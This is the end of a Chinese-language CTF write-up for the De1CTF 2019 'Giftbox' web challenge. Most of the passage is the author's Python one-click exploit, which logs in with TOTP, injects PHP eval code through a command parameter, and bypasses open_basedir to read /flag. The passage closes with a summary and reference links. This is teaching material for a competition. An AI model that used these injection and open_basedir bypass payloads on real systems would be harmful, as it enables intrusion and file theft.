    def get(session, url, params, proxies):
        retry = 0 
        while  True:
            retry += 1
            try:
                if session:
                    if proxies:
                        res = s.get(url, params=params, timeout=timeout, proxies=proxies)
                    else:
                        res = s.get(url, params=params, timeout=timeout)
                else:
                    if proxies:
                        res = requests.get(url, params=params, proxies=proxies)
                    else:
                        res = requests.get(url, params=params)
            except Exception as e:
                if retry >= retry_count:
                    print('timeout or server error!')
                    exit()
                continue
            break
        return res
    def login(username, password):
        login_url = 'http://136.244.114.21:8090/shell.php'
        params = {
            'a' : 'login %s %s' % (username, password),
            'totp' : totp.now()
        }
        if debug:
            print(params)
        # start login session=1
        r = get(1, login_url, params, 0)
        return r
    def fuzzer(characters = fuzz_char ,position = '0'):
        if debug:
            print('Fuzzer Start')
        fuzz_url = 'http://136.244.114.21:8090/shell.php'
        available_char = []
        available_char_ascii = [] 
        payload_params = {
            'a' : 'targeting 0 1',
            'totp' : totp.now() 
        }
        for ch in fuzz_char:
            params = payload_params.copy()
            params['a'] = params['a'].replace(position, ch)
            res = get(1 , fuzz_url, params, 0)
            if deep_debug:
                print(params)
                print(payload_params)
                print(res.content)
                # break
            if 'bad code' not in res.text and 'bad position' not in res.text and '"code":0' in res.text:
                if deep_debug:
                    print(res.content)
                available_char.append(ch)
                available_char_ascii.append(ord(ch))
        if debug:
            print('Fuzz Length start...')
            print(payload_params)
        fuzz_length = 0
        max_len = 30
        fuzz_len = 0
        length_params = {
            'a' : 'targeting 0 1',
            'totp' : totp.now() 
        }
        fuzz_string = ''
        for count in range(max_len):
            fuzz_string = fuzz_string + '1'
            params = length_params.copy()
            params['a'] = params['a'].replace(position, fuzz_string)
            res = get(1, fuzz_url, params, 0)
            if deep_debug:
                print(position)
                print(params)
                print(fuzz_string)
                break
            if 'too long' in res.content:
                fuzz_len = count
                break
        print('payload_params:')
        print(payload_params)
        print('Position %s  maxLength:' % position)
        print(fuzz_len + 1)
        print('Position %s Available_char:' % position)
        print(''.join(available_char))
        print('Position %s Available_char_ascii:' %  position)
        print(available_char_ascii)
        if debug:
            print('Fuzzer End')
        return True
    def destruct():
        destruct_url = 'http://136.244.114.21:8090/shell.php'
        payload = 'destruct'
        params = {
            'a': '%s' % payload,
            'totp' : totp.now()
        }
        res = get(1, destruct_url, params, 0)
        if debug:
            print('destructing.........')
            print('destruct params:')
            print(params)
            print('res_content:')
            print(res.content)
            print('destructed.............')
        if 'missiles destructed' in res.content:
            return True
        else:
            print('Fail ! destruct please check!')
            exit()
    def targeting(code, position):
        targeting_url = 'http://136.244.114.21:8090/shell.php'
        payload = 'targeting %s %s' % (code, position)
        params = {
            'a' : payload,
            'totp' : totp.now()
        }
        res = get(1, targeting_url, params, 0)
        if debug:
            print('params:')
            print(params)
            print('res_code:' + str(res.status_code))
            print('res_content:')
            print(res.content)
        if res.content == '':
            print('timeout or server error!')
            exit()
        if 'mark' not in res:
            return False
        return True
    def launch():
        launch_url = 'http://136.244.114.21:8090/shell.php'
        payload = 'launch'
        params = {
            'a' : payload,
            'totp' : totp.now(),
            # bypass open_basedir
            'x' : "chdir('css');ini_set('open_basedir','..');chdir('..');chdir('..');chdir('..');chdir('..');ini_set('open_basedir','/');echo(file_get_contents('/flag'));"
            # 'x' : 'phpinfo();'
            # 'f' : 'assert'
        }
        if debug:
            print("starting launch......")
            print('params:')
            print(params)
            print('payload:')
            print(payload)
            print("launch end......")
        return get(1, launch_url, params, 0).content
    def get_flag():
        attack_url = 'http://136.244.114.21:8090/shell.php'
        username = 'admin'
        # Get password from sqlmap
        password = 'hint{G1ve_u_hi33en_C0mm3nd-sh0w_hiiintttt_23333}'
        is_login = False
        if 'login success' in login(username, password).content:
            is_login = True
            if debug:
                print('islogin:')
                print(is_login)
        else:
            print('login fail!')
            exit()
        # Solve monitor 
        fuzzer(fuzz_char, '0')
        fuzzer(fuzz_char, '1')
        # Clean missiles
        destruct()
        # Add code
        targeting('b', '{$_GET{x}}')
        targeting('c', '${eval($b)}')
        flag_res = launch()
        if debug:
            print("flag_response start.........")
            print(flag_res)
            print("flag_response end...............")
        flag_pattern = re.compile('[a-zA-Z0-9]{6}{.*?}')
        flag_is = re.search(flag_pattern, flag_res)
        if flag_is:
            flag = flag_is.group()
            print("Get The Flag: ..................")
            print(flag)
    if __name__ == '__main__':
        # app.run()  #开启这个之后可以sqlmap注入
        get_flag()
这个是我自己写的，能一键getflag，然后配置下开头的一些参数可以看到调试信息。
## 0x5 总结
除开那个拟态防御的calc题目，还有第一题那个送分题简写外，另外几道题我会分别写文章详细记录下做题过程，以及一些知识点的原理性分析，下一篇
从一个入门pwn的菜鸟web狗角度出发写 从国赛决赛的webpwn到Delctf的webpwn学习之旅。
## 0x6 参考链接
收集了一些wp方便大家查阅:
[De1CTF 2019-WriteUp-ChdMd5](https://mp.weixin.qq.com/s/EN8cch8uO8Qnfb_eewbw9w)
[从PHP底层看open_basedir
bypass](https://skysec.top/2019/04/12/%E4%BB%8EPHP%E5%BA%95%E5%B1%82%E7%9C%8Bopen-basedir-bypass/)
[官方wp](https://github.com/impakho/ciscn2019_giftbox/blob/master/exp.py)
[De1CTF-Giftbox题解](\[https://hpdoger.cn/2019/08/06/De1CTF-Giftbox%E9%A2%98%E8%A7%A3/\]\(https://hpdoger.cn/2019/08/06/De1CTF-Giftbox题解/))
[理解 JavaScript 的 async/await](https://segmentfault.com/a/1190000007535316)
[帮助你开始理解async/await](https://juejin.im/post/5ae57d8d6fb9a07aa6318a20)
[TOTP(基于时间的一次性口令)简析
python实现](https://blog.csdn.net/juxua_xatu/article/details/50252957)
[浅谈几种Bypass-open-basedir的方法](\[https://www.mi1k7ea.com/2019/07/20/%E6%B5%85%E8%B0%88%E5%87%A0%E7%A7%8DBypass-open-basedir%E7%9A%84%E6%96%B9%E6%B3%95/\]\(https://www.mi1k7ea.com/2019/07/20/浅谈几种Bypass-open-basedir的方法/))
[PHP绕过open_basedir列目录的研究](https://www.leavesongs.com/PHP/php-bypass-open-basedir-list-directory.html)